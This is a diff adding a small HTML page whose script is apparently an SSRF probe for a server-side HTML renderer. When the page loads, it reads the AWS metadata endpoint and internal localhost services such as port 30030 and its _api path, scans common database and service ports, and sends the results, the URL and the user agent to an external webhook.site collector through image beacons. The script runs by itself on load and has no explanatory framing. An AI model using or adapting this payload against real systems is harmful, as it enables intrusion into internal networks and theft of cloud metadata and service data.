@@ -1,0 +1,21 @@
+<!doctype html><html><head><meta charset="utf-8"><title>SJ</title></head><body>
+<pre id="o" style="font-size:10px;white-space:pre-wrap">running</pre>
+<script>
+var U="https://webhook.site/338ff904-b777-4ce4-918f-dac75ab3dcd5/",L=[];
+function w(s){L.push(s);try{document.getElementById("o").textContent=L.join("\n");}catch(e){}}
+function b(t,v){var i=new Image();i.src=U+"B?t="+encodeURIComponent(t)+"&v="+encodeURIComponent(String(v).substring(0,400));}
+window.addEventListener("securitypolicyviolation",function(e){w("CSP "+e.blockedURI+" "+e.violatedDirective);b("csp",e.blockedURI+"|"+e.violatedDirective);});
+b("ALIVE",location.href); w("HREF="+location.href); b("UA",navigator.userAgent); w("UA="+navigator.userAgent);
+function g(u,n){try{var x=new XMLHttpRequest();x.open("GET",u,false);x.send();var r=String(x.responseText).replace(/\s+/g," ").substring(0,350);w(n+" "+x.status+" :: "+r);b(n,x.status+"::"+r);}catch(e){w(n+" ERR "+e.message);b(n+"-ERR",e.message);}}
+g(U+"ctl","CTL-HTTPS-XHR");
+g("http://127.0.0.1:30030/","INT-30030");
+g("http://127.0.0.1:30030/_api/html/","INT-30030-API");
+g("http://localhost:30030/","INT-LOCALHOST-30030");
+g("http://127.0.0.1/","INT-80");
+g("http://169.254.169.254/latest/meta-data/","AWS-META");
+var ports=[80,443,3000,5000,8000,8080,8443,9000,9090,9200,5432,6379,27017,30030,30031,30032];
+ports.forEach(function(p){var t=Date.now();fetch("http://127.0.0.1:"+p+"/",{mode:"no-cors"}).then(function(){w("PORT "+p+" OPEN "+(Date.now()-t));b("PORTOPEN",p);},function(){w("PORT "+p+" x "+(Date.now()-t));});});
+</script>
+<p>IFRAME-CTL:</p><iframe src="https://webhook.site/338ff904-b777-4ce4-918f-dac75ab3dcd5/ifr" style="width:680px;height:90px;border:1px solid #000"></iframe>
+<p>IFRAME-INT:</p><iframe src="http://127.0.0.1:30030/" style="width:680px;height:90px;border:1px solid #000"></iframe>
+</body></html>
